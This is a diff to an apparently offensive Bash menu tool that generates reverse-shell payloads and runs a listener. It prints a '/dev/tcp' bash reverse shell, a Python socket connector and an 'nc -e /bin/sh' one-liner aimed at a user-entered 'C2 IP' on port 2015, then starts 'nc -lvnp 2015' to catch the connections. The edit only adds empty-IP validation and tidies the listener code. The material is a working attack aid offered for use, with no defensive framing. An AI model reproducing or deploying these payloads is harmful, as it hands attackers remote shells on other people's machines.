@@ -45,7 +45,9 @@ while true; do
             echo ""
             echo -ne "  ${Y}Enter C2 IP default: $PUB_IP > ${N}"
             read -r target_ip
-            [ -z "$target_ip" ] && target_ip="$PUB_IP"
+            # Validasi IP Kosong
+            if [ -z "$target_ip" ]; then echo -e "  ${R}[!] Error: IP cannot be empty.${N}"; sleep 1.5; continue; fi
+            
             echo ""
             echo -e "  ${G}[+] Compiling Bash Session Bridge...${N}"; sleep 1
             echo -e "  ${W}Vector:${N} bash -i >& /dev/tcp/${target_ip}/2015 0>&1"
@@ -56,7 +58,9 @@ while true; do
             echo ""
             echo -ne "  ${Y}Enter C2 IP default: $PUB_IP > ${N}"
             read -r target_ip
-            [ -z "$target_ip" ] && target_ip="$PUB_IP"
+            # Validasi IP Kosong
+            if [ -z "$target_ip" ]; then echo -e "  ${R}[!] Error: IP cannot be empty.${N}"; sleep 1.5; continue; fi
+            
             echo ""
             echo -e "  ${G}[+] Compiling Python Socket Connector...${N}"; sleep 1
             echo -e "  ${W}Vector:${N}"
@@ -68,7 +72,9 @@ while true; do
             echo ""
             echo -ne "  ${Y}Enter C2 IP default: $PUB_IP > ${N}"
             read -r target_ip
-            [ -z "$target_ip" ] && target_ip="$PUB_IP"
+            # Validasi IP Kosong
+            if [ -z "$target_ip" ]; then echo -e "  ${R}[!] Error: IP cannot be empty.${N}"; sleep 1.5; continue; fi
+            
             echo ""
             echo -e "  ${G}[+] Compiling Netcat Payload...${N}"; sleep 1
             echo -e "  ${W}Vector:${N} nc -e /bin/sh ${target_ip} 2015"
@@ -79,16 +85,9 @@ while true; do
             echo ""
             echo -e "  ${G}[+] Starting C2 Listener on port 2015...${N}"
             echo -e "  ${Y}[!] Awaiting incoming connections... (Press CTRL+C to stop)${N}"
-            
             trap trap_ctrl_c SIGINT
-            
-            # 2>/dev/null nge-sembunyiin pesan "Ncat: Version xxx (https://nmap.org)"
-            if command -v nc >/dev/null 2>&1; then 
-                nc -lvnp 2015 2>/dev/null
-            elif command -v ncat >/dev/null 2>&1; then 
-                ncat -lvnp 2015 2>/dev/null
-            fi
-            
+            if command -v nc >/dev/null 2>&1; then nc -lvnp 2015 2>/dev/null
+            elif command -v ncat >/dev/null 2>&1; then ncat -lvnp 2015 2>/dev/null; fi
             trap - SIGINT
             echo ""
             read -p "  Press Enter to continue..."
